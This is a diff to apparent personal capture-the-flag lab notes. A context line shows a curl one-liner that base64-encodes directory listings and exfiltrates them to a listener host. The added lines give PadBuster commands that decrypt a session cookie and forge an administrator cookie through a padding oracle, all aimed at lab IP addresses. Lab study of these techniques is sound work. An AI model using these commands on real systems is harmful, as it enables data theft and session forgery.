@@ -256,3 +256,16 @@ this will expose an internal only port 22 as a public port 8888
 this will exfiltrate command outputs if all you have is the ability to make web requests:
 
 `ls -laR ../../../ | base64 -w0 | xargs -I T curl 10.10.149.217:1234/?x=T`
+
+## padding oracle attacks
+
+use https://github.com/AonCyberLabs/PadBuster
+might need to install: `sudo apt-get install libcrypt-ssleay-perl`
+
+command to decrypt some cookie value:  
+
+`./padBuster.pl http://10.10.31.123/index.php TaIt46TG994JDsPmpFp8Q0XovkIFJHY4 8 -cookies hcon=TaIt46TG994JDsPmpFp8Q0XovkIFJHY4 -error "Invalid padding"`
+
+if that works, and the cookie value is something you want to manipulate, you can use the same tool to encrypt via the -plaintext argument:
+
+`./padBuster.pl http://10.10.31.123/index.php TaIt46TG994JDsPmpFp8Q0XovkIFJHY4 8 -cookies hcon=TaIt46TG994JDsPmpFp8Q0XovkIFJHY4 -error "Invalid padding" -plaintext user=administratorhc0nwithyhackme`
